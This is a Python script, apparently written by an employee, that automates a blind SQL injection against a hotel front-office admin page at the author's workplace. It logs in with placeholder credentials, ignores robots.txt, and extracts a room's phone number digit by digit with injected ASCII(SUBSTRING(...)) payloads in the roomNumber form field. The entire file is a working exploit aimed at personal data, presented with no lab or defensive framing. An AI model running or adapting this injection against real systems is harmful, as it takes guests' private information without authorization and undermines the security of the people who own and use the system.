# An app that automated a SQL Injection
# vulnerability for the admin pages at
# my workplace

import mechanize


class AdminPages:
    """
    Models a connection to the admin pages

    Opens the homepage, logs in, and finds the
    phone number associated to a room via SQL Injection
    """

    br = mechanize.Browser()
    base_url = ''

    def __init__(self, base_url=None):
        """
        Ignores robots.txt and goes to the homepage

        :param base_url: base url of the webpage; this changes
                         if you're running it from a different
                         server or VM
        """

        if base_url:
            self.base_url = base_url
        else:
            self.base_url = 'http://intern1:8000'

        self.br.set_handle_robots(False)
        self.br.open(self.base_url)

    def login(self):
        """
        Logs in to the admin pages

        uname and passwd are currently dummy values
        """

        self.br.select_form(name = "loginform")
        self.br["uname"] = "user"
        self.br["passwd"] = "pass"
        self.br.submit()

    def find_phone_number(self, room_number: str):
        """
        Finds the phone number associated to room_number via
        SQL injection

        :param room_number: the room number whose phone number you
                            want to find
        :return: The phone number that is associated with the room;
                 An empty string if the injection fails or there isn't
                 a phone number set
        :rtype: str
        """

        phone_number = ""

        print("Finding phone number for room number {}..".format(room_number))

        for iteration in range(1, 11):  # 10-digit phone number
            field_input = "{}' AND ASCII(SUBSTRING(phone, {}, {})) = ".format(room_number, iteration, iteration)

            for num in range(48, 58):  # ASCII [0-9]
                field_input_copy = field_input            # need a copy so it doesn't keep
                field_input_copy += "{}; --".format(num)  # adding on to the string each loop

                response = self.__submit_room_information(field_input_copy)
                page = str(response.read())

                if not page.find('<B>ERROR:') > 0:
                    phone_number += chr(num)
                    break

            print("{}% done". format(iteration * 10))

        return phone_number

    def __submit_room_information(self, room_number: str):
        """
        Submits a room number to the room information page

        :param room_number: the room number to get room info from
        :return: a :class: 'mechanize.Response' object from
                 the submitted form
        """

        self.br.open("{}/admin/hotel/frontOffice/roomInfo/roomEntry.php".format(self.base_url))
        self.br.select_form(name = "roomForm")
        self.br["roomNumber"] = room_number
        return self.br.submit()

    @staticmethod
    def get_room_number():
        """
        Get a room number from the user via the keyboard

        :return: the room number
        :rtype: str
        """

        while True:
            try:
                room_number = str(input('Enter a room number: '))
                break
            except (ValueError, NameError):
                print("Error with the inputted room number. Room numbers are alphanumeric.")

        return room_number


def main():
    """
    Opens the homepage and logs in. The user enters in
    a room number, and we find the phone number associated
    to the room via SQL Injection
    """

    # Setup admin pages (go to the home page)
    # and login
    admin_pages = AdminPages()
    admin_pages.login()

    # Users picks a room, and we find the phone number for it via injection
    room_number = admin_pages.get_room_number()
    phone_number = admin_pages.find_phone_number(room_number)

    print("The phone number for room {} is {}".format(room_number, phone_number))


if __name__ == '__main__':
    main()

